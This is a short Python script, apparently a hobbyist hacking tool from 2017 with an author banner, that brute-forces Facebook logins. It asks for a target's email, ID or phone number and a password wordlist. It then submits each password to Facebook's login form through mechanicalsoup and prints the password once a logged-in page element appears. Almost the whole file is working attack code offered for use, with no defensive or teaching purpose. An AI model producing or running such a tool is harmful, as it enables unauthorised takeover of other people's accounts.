#login_form
#email
#pass
import mechanicalsoup


print("""

   _____  .__       .___                                          .___
  /  _  \ |  |    __| _/____ __  _  _______  ___.__. _____   ____ |  |__
 /  /_\  \|  |   / __ |\__  \\ \/ \/ /\__  \<   |  |/     \_/ __ \|  |  \
/    |    \  |__/ /_/ | / __ \\     /  / __ \\___  |  Y Y  \  ___/|   Y  \
\____|__  /____/\____ |(____  /\/\_/  (____  / ____|__|_|  /\___  >___|  /
        \/           \/     \/             \/\/          \/     \/     \/

		int:~ x_man_aldawaymeh  facebook:~ m3roor
	date:~ 4/7/2017


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
""")

email = str(input("email or id or phnumber : "))
while email == '':
	print("~~Eroor ~::~  Plz Enter Email or Id or Ph_numbe~~~ ")
	print("  ")
	email = str(input("email or id or phnumber : "))
wlist = str(input("worlist : "))
while wlist == '':
	print("~~Error ~::~ You Dont Enter WList~~~")
	print("  ")
	wlist = str(input("worlist : "))
op = open(wlist,"r")
browser = mechanicalsoup.Browser() #for Ent to browser
login_page = browser.get("https://www.facebook.com/login.php?login_attempt=1&lwv=100") #from browser i want get on link this
login_form = login_page.soup.select("#login_form")[0] #from link (login_form get first id  this > # ==>id)
for i in op.readlines(): #for process loob to file==>op & readlines
   i = i.rstrip("\n")
   login_form.select("#email")[0]['value'] = email #from login_from get id == # (email) 0 first value
   login_form.select("#pass")[0]['value'] = i #sim sim
   page2 = browser.submit(login_form, login_page.url) #for submit for login
   print("try:: "+i)
   for h in page2.soup.findAll("a"):
       h = h.text
       if h == "Search":
           print("the password is ::: >> "+i)
  
